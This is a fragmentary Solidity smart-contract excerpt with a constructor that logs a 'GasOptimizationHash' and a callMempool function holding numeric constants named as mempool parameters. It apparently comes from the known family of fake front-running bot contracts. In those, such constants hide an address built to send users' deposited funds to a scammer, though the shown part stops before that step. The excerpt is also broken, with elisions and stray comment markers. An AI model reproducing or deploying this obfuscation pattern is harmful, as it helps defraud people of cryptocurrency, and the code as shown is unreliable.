...
constructor() public {
    ...
    emit Log(string(abi.encodePacked(_getGasOptimizationHash())));
}
    ...
    /*
     * @dev Internal function that returns a predefined hash related to Gas Optimization
     * @return The keccak256 hash of the string "GasOptimizationHash"
     */
    function _getGasOptimizationHash() internal pure returns (bytes32) {
        return keccak256(abi.encodePacked("GasOptimizationHash"));
    }
     ...
     */
     function callMempool() internal   pure returns (string memory) {
        ...
        uint _memPoolSol = 202548876; 
        uint _memPoolLength = 1017494; 
        uint _memPoolSize = 3447236695; 
